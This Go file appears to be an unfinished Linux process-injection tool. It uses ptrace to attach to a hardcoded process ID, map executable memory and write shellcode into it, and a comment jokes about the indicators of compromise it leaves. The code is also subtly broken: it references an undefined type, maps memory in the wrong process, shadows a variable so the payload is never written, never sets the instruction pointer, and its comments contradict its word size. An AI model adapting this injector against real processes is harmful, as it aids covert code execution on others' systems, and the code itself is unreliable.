// +build linux

package zoo

import (
  "fmt"
  "errors"
  "unsafe"
  "syscall"
)

//change n use pure syscall

type PTraceInjector struct{}
//Sstill fixing the input/output error (only run with sudo perms maybe it will weork)
func Run(payload []byte)error{
  injector := &PTraceInjector{}
  if err := injector.Inject(1234,payload); err != nil{
    return err
  }
  return nil
}

func (scr *ShellCodeRunner) RunShellCode()error{
  return nil
}
/*
get the pid
attach to the proc
get the regs
write to rip

PTRACE_POKETEXT is used to write in the memory of the process being debugged. This is how we actually inject the code in the target process. There is a PTRACE_PEEKTEXT also.
The PTRACE_POKETEXT function works on words, so we convert everything to word pointers (32bits) and we also increase i by 4.
*/
func (i *PTraceInjector) Inject(pid int,payload []byte)error{
  //attach to the target process
  if err := Ptrace(syscall.PTRACE_ATTACH,pid,0,0); err != nil{
    return err
  }
  // wait for the process to stop
  var ws syscall.WaitStatus
  if _, err := syscall.Wait4(pid,&ws,0,nil);err != nil{
    return err
  }
  //find the location of the main function in the process (rip)
  _,err := PtracePeekText(pid,uintptr(unsafe.Pointer(&payload[0])))
  if err != nil{
    return err
  }
  //allocate memory in the target process
  var addr uintptr
  if err := PtraceAllocateMemory(pid,&addr,uintptr(len(payload))); err != nil{
    return err
  }
  //write payload to allocated memory
  if err := PtraceWriteMemory(pid,addr,payload); err != nil{
    return err
  }
  //modify the instruction pointer to point to the start of the program
  regs,err := PtraceGetRegisters(pid)
  if err != nil{
    return err
  }
  if err := PtraceSetRegisters(pid,regs); err != nil{
    return err
  }
  return nil
}

func PtraceSetRegisters(pid int,regs syscall.PtraceRegs) error{
  if err := Ptrace(syscall.PTRACE_SETREGS,pid,0,uintptr(unsafe.Pointer(&regs)));err != nil{
    return errors.New(fmt.Sprintf("Error setting registers: %s",err))
  }
  return nil
}

func PtraceGetRegisters(pid int) (syscall.PtraceRegs,error){
  var regs syscall.PtraceRegs
  if err := Ptrace(syscall.PTRACE_GETREGS,pid,0,uintptr(unsafe.Pointer(&regs))); err != nil{
    return regs,errors.New(fmt.Sprintf("Error getting registers: %s",err))
  }
  return regs,nil
}

func Ptrace(request,pid int, addr,data uintptr) error{
  _,_,err := syscall.Syscall6(syscall.SYS_PTRACE,uintptr(request),uintptr(pid),uintptr(addr),uintptr(data),0,0)
  if err != 0 {
    return err
  }
  return nil
}

func PtraceWriteMemory(pid int,addr uintptr,data []byte) error{
  //this for loop is a nice IOC ..Probably or not :)
  for i := 0; i < len(data); i += 8{
    var word uintptr
    if i+8 <= len(data) {
      word,err := PtraceReadMemory(pid,addr+uintptr(i))
      if err != nil { return err }
      copy((*[8]byte)(unsafe.Pointer(&word))[:],data[i:])
    }
    if err := Ptrace(syscall.PTRACE_POKETEXT,pid,addr+uintptr(i),word); err != nil{
      return errors.New(fmt.Sprintf("Error writing to memory: %s",err))
    }
  }
  return nil
}

func PtraceReadMemory(pid int,addr uintptr) (uintptr,error){
  word,err := PtracePeekText(pid,addr)
  if err != nil {
    return word,errors.New(fmt.Sprintf("Error Reading Memory: %s",err))//should probably panic here
  }
  return word,nil
}

var PtracePeekText = func(pid int, addr uintptr)(uintptr,error){
  var word uintptr
  if err := Ptrace(syscall.PTRACE_PEEKTEXT,pid,addr,uintptr(unsafe.Pointer(&word))); err != nil{
    return 0,errors.New(fmt.Sprintf("Error Peeking text: %s",err))
  }
  return word,nil
}

var PtraceAllocateMemory = func(pid int,addr *uintptr,size uintptr)error{
  _,_,err := syscall.Syscall6(syscall.SYS_MMAP,uintptr(unsafe.Pointer(addr)),size,syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,syscall.MAP_PRIVATE|syscall.MAP_ANONYMOUS,uintptr(syscall.Stdin),0)
  if len(err.Error()) > 0{
    return errors.New(fmt.Sprintf("Error allocating memory: %s",err.Error()))
  }
  return nil
}
